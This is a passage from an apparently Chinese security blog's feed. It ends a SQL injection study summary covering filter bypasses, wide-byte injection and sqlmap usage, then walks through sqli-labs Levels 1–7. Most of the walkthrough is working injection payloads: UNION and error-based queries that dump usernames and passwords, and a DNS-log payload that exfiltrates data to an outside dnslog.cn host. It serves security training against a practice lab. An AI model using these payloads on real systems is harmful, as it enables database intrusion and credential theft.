也可以代替字符，甚至利用的好，括号()也可以代替空格。</p><p><code>and</code>变式<code>&amp;&amp;</code>、<code>or</code>变式<code>||</code>。</p><p>有时候<code>union</code>也可以被<code>||</code>替换，相当于条件判断。</p><p>替换也常常全被过滤，并不是绝对有效。</p><p><strong>注意：</strong></p><p><strong>有时候我们需要多种过滤结合运用，如<code>/!UNIunionON/</code></strong></p><p><strong>二、其余绕过方法</strong></p><p>1、宽字节注入</p><p>原理：</p><p>当某字符的大小为一个字节时，称其字符为窄字节；当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，但汉字占两个字节。</p><p>宽字节是指一个字符占用两个字节的编码方式。常见的宽字节编码包括GB2312、‌GBK、GB18030、‌BIG5、‌Shift_JIS等。与单字节编码（如ASCII）相比，宽字节编码能够表示更多的字符，特别是中文、日文和韩文等语言中的复杂字符。</p><p>简单来说，宽字节就是用两个字节来表示更多的字符，特别是中文的汉字这么多，用单字节来表示是远远不够的。</p><p>如果使用了类似于 set names gbk 这样的语句，MySQL 在使用 GBK 编码的时候，mysql 数据库就会将 Ascii 大于等于128（比如%df）的字符当作是汉字字符的一部分（当作汉字处理），同时把两个字节认成一个汉字，例如 %aa%5c 就被认作是一个汉字；Ascii小于128还是单字节表示。</p><p>这种情况下如果我们想去掉sql语句中的一个字节，那么我们在想去的字节前加上一个Ascii 大于等于128（%df）的字节就行了。自己加的字节和想去掉的那个字节会被合起来解析成为汉字。或者把库名、表名等转换成16进制，从而省略掉单引号</p><p>2、上面提到的<strong>HANDLER命令</strong>以及编码后预处理</p><p>这两种方法都可在堆叠注入的情况下绕过select。</p><h2 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021933100.png"></p><p><strong>sqlmap使用常用步骤：</strong></p><p>进入sqlmap所在文件夹，在文件路径处输入cmd并回车（即在sqlmap路径下打开命令行）。</p><p><strong>get型：</strong></p><p>检测「注入点」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1<br></code></pre></td></tr></table></figure><p>查看所有「数据库」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 --dbs<br></code></pre></td></tr></table></figure><p>查看当前使用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 --current-db<br></code></pre></td></tr></table></figure><p>查看「数据表」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 --tables<br></code></pre></td></tr></table></figure><p>查看「字段」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 -T 表名 –columns<br></code></pre></td></tr></table></figure><p>查看「数据」</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://xx/?<span class="hljs-built_in">id</span>=1 -D 数据库名 -T 表名 –dump<br></code></pre></td></tr></table></figure><p><strong>post型：</strong></p><p>需要用burpsuite抓包，写入txt文件，然后使用-r参数</p><p>检测「注入点」</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -<span class="hljs-attribute">r</span> txt文件所在位置<br></code></pre></td></tr></table></figure><p>查看所有「数据库」</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">python sqlmap<span class="hljs-selector-class">.py</span> -<span class="hljs-attribute">r</span> txt文件所在位置 <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure><p>（后续步骤依次类推）</p><p>参考文献：</p><p><a href="https://blog.csdn.net/qq_45477063/article/details/129374044" title="sqlmap安装详细教程-CSDN博客">sqlmap安装详细教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688" title="【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客">【SQL注入】Sqlmap使用指南(手把手保姆版)持续更新_sqlmap使用教程-CSDN博客</a></p><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510" title="SQLmap使用教程图文教程（超详细）-CSDN博客">SQLmap使用教程图文教程（超详细）-CSDN博客</a></p><p>sqlmap官方使用指南：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" title="Usage · sqlmapproject&#x2F;sqlmap Wiki · GitHub">Usage · sqlmapproject&#x2F;sqlmap Wiki · GitHub</a></p><p>上面文章讲的都很好，在此不多作赘述，</p><p>第一个文章讲了在windows下安装sqlmap的教程</p><p>第二个文章可以作为入门的尝试，学习基础功能；</p><p>第三个文章有更多的参数，可以进一步学习；</p><p>官方文档可以作为查询工具，用来入门的话太过枯燥</p><h3 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h3><p>请见：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142714714?spm=1001.2014.3001.5501" title="Web安全常用工具 （持续更新）-CSDN博客">Web安全常用工具 （持续更新）-CSDN博客</a></p><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>可以看上面链接简单了解，具体用法建议在实际过程中学习，请移步至作者的sqli-labs通关。</p><h3 id="Postman"><a href="#Postman" class="headerlink" title="Postman"></a>Postman</h3><p>与hackbar功能相近，用法相似，会一种即可。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs通关全详解</title>
    <link href="/2025/05/04/sqli-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/04/sqli-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142738784?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行大部分Web手接触的第一个漏洞——SQL注入的学习，SQL注入是owasp top10之一，是Web安全常见漏洞。为探讨清楚SQL注入的诸多细节，<strong>我们特选经典的sqli-labs进行从入门到进阶的强化训练</strong>。</p><p>在做题过程中，作者把用到的知识进行了全面、详细、系统的总结，所以为了方便学习，查阅适配此文的总结是必不可少的**（怎么可以光训练不去学习、总结呢）**。</p><p>作者的总结：<a href="https://blog.csdn.net/2302_81178149/article/details/142738173" title="SQL注入学习总结_sql注入csdn-CSDN博客">SQL注入学习总结_sql注入csdn-CSDN博客</a></p><p>sqli-labs安装与配置可以参考：<a href="https://www.freebuf.com/articles/web/271772.html" title="SQL注入之sqli-labs（安装与配置） - FreeBuf网络安全行业门户">SQL注入之sqli-labs（安装与配置） - FreeBuf网络安全行业门户</a></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="手工UNION联合查询注入"><a href="#手工UNION联合查询注入" class="headerlink" title="手工UNION联合查询注入"></a>手工UNION联合查询注入</h3><p>首页面</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935977.png"></p><p>在输入框按提示输入   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1<br></code></pre></td></tr></table></figure><p>有回显，尝试多次，发现id从1开始输出不同的用户，如id&#x3D;1时，有用户名Dump</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935159.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27;<br></code></pre></td></tr></table></figure><p>输入单引号，页面报错，You have an error in your SQL syntax;</p><p>应该是有注入漏洞，当然，这里肯定有注入漏洞</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935026.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2<br></code></pre></td></tr></table></figure><p>似乎是字符型注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935816.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br></code></pre></td></tr></table></figure><p>报错   ‘ ‘1’’ LIMIT 0,1 ‘  ，可以看出输入了1‘，根据报错信息确定咱们输入内容放到一对单引号中，脑补一下咱们输入的内容在数据库出现的位置：select … from … where id&#x3D;’1’  LIMIT 0,1 ……，确定是字符型注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935896.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure><p>递增尝试，从<code>select 1 --+</code>到<code>select 1,2,3 --+</code>，到3时没有报错但为什么没显示1，2，3？</p><p>这里就涉及到了联合查询的一个知识点，如果联合查询前面条件为真，后面语句就不执行了，所以我们需要让联合查询前面条件为假，怎么让联合查询为假？</p><p>我们可以直接使用-1，或者是使用更大的数字，但是-1肯定不存在，因为id一般是无符号整型，经尝试，0也可以。</p><p>还要注意转义，空格转义成<code>+</code>，<code>-- </code>应写为<code>--+</code>（所有get传参中，都要进行url编码。<code>+</code>在url编码中代表空格<code> </code>）</p><p>在线URL 编码&#x2F;解码工具：<a href="https://www.toolhelper.cn/EncodeDecode/Url" title="URL 编码&#x2F;解码 - 锤子在线工具">URL 编码&#x2F;解码 - 锤子在线工具</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935014.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p>换成0后，联合查询前面的条件为假，我们再次逐次尝试，发现select 1,2,3时能够正常显示，表明有3项数据传回，其中1所在位置不显示，2所在位置显示在Your Login name: ，3所在位置显示在Your Password: 。可以在2，3所在位置下手。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935774.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</span><br></code></pre></td></tr></table></figure><p>爆表名</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935899.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>爆列名</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021935252.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password),3 from users --+</span><br></code></pre></td></tr></table></figure><p>爆用户数据，其实与之前id一一对应，id&#x3D;1时，正是用户Dump</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936505.png"></p><h3 id="手工报错型注入"><a href="#手工报错型注入" class="headerlink" title="手工报错型注入"></a>手工报错型注入</h3><p><strong>法一、floor()报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936873.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="hljs-string">&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936335.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936395.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure><p>发现显示了id&#x3D;1的用户Dump，而不是报错注入，改一改id试试？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936830.png"></p><p> 改了之后虽然用户数据全部出来，但仍不是报错型注入（未从报错中显示），不符合我们的期望。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),floor(rand(0)*2)) as x from information_schema.tables group by x--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936664.png"></p><p>  <code>limit 0,1</code>从第一行开始显示一行数据</p><p>这才是报错型注入，可用limit逐行输出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,(select concat(username, &#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936644.png"></p><p><strong>法二、extractValue()报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) --+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936564.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936139.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p>查询后发现不是我们想要的，可能是查错表了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936518.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>users<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure><p>加上库名，防止有重名的表</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936203.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users)))--+</span><br></code></pre></td></tr></table></figure><p>发现查的不全，默认只能返回32个字符，可以用substring()函数解决</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936469.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,substring((select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),1,32))) --+</span><br></code></pre></td></tr></table></figure><p>用substring先查32个字符</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936892.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,substring((select group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users),32,32))) --+</span><br></code></pre></td></tr></table></figure><p>再查32个，依次往下查</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936142.png"></p><p><strong>法三、updateXml()报错注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(database())),&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;)--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936666.png"></p><p>后续与extractValue()报错注入相似</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>查不出来，似乎是数字型注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021936593.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>报错  ‘’ LIMIT 0,1’  ，输入的内容直接放在数据库里，是所谓的数字型注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937329.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>不加单引号也能查，确定是数字型注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937822.png"></p><p>后续步骤相似，仅把第一题?id&#x3D;0后面的单引号去掉</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>报错  ‘’1’’) LIMIT 0,1’  ，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，脑补一下咱们输入1在数据库语句中的位置，形如select … from … where id&#x3D;(‘1’) LIMIT 0,1  …</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937251.png"></p><p>后续步骤相似，仅把第一题?id&#x3D;0’的后面加上)</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p>报错  <code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code>  ，包裹在(“”)中</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937082.png"></p><p>后续步骤类似，仅把第一题?id&#x3D;1的后面改为”)</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h3 id="手工报错注入"><a href="#手工报错注入" class="headerlink" title="手工报错注入"></a>手工报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>不再显示用户名与密码，UNION联合查询型注入不能用了，估计要用报错注入或盲注。</p><p>先来报错注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937760.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p>还好，报错注入还好使，（报错也是一种回显，可以借此显示出我们想要的信息）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937918.png"></p><p>剩下步骤不再重复</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注比较繁琐，往往会用sqlmap等自动注入工具。但是盲注会发送大量请求，占用服务器，容易被禁ip，往往不被优先考虑。</p><p>这里先不引入工具的使用。小伙伴们最好不要过度依赖工具，工具确实是强大、方便的，前面几个题用工具的话很容易出用户数据，但只使用工具的话和没学一样，练熟练基本功才会有后续提升。</p><p>而且对于盲注来说，能自己写出脚本才能算真正学会。</p><p><strong>sqlmap盲注步骤详见less-7。</strong></p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure><p>是用双引号闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937000.png"></p><p>报错注入或时间盲注（以报错注入为例，盲注的例子可以看less-7）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(0x7e,(select database()))) --+<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937481.png"></p><p>然后就是常规流程</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="DNS-log注入"><a href="#DNS-log注入" class="headerlink" title="DNS log注入"></a>DNS log注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>报语法错误，但不能看出有用信息</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937488.png"></p><p>试了试，报错注入不能用了，因为报不出有用信息。</p><p>按常规考虑，应该进行布尔盲注或者时间盲注，但是盲注一般使用sqlmap跑，不能有效训练我们。</p><p>难道这里只能用工具了吗？</p><p>当然不，我们这里用一个巧妙地方法——DNSlog注入，这种方法相对于盲注来说请求个数更少（和常规注入个数一样），可以手动操作（减少禁ip的风险）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>                  You <span class="hljs-keyword">are</span> in.... Use outfile......提示用文件<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27;             回显You have an error in your SQL syntax，不告诉我们哪里错了，看不见闭合</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-comment">--+              回显You have an error in your SQL syntax</span><br> <br>...<br> <br>...<br> <br>...<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;))--+            You are in.... Use outfile...... </span><br></code></pre></td></tr></table></figure><p>说明是字符型注入闭合是<code>&#39;))</code></p><p>不知道为啥<code>?id=1&#39;‘--+</code>这里也可以，但后续步骤又不行，大家这步可以讨论一下</p><p><strong>正式开始注入</strong></p><p>尝试用and去注入不太行，换成union</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;)) union SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(SELECT HEX(database())),&#x27;</span>.qefbk8.dnslog.cn\\abc<span class="hljs-string">&#x27;)),2,3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021937381.png"></p><p>随便找个<strong>在线16进制字符串转换工具</strong>进行转换</p><p><a href="https://tool.hiofd.com/hex-convert-string-online/" title="在线16进制字符串转换工具 - 在线工具网">在线16进制字符串转换工具 - 在线工具网</a></p><p><img 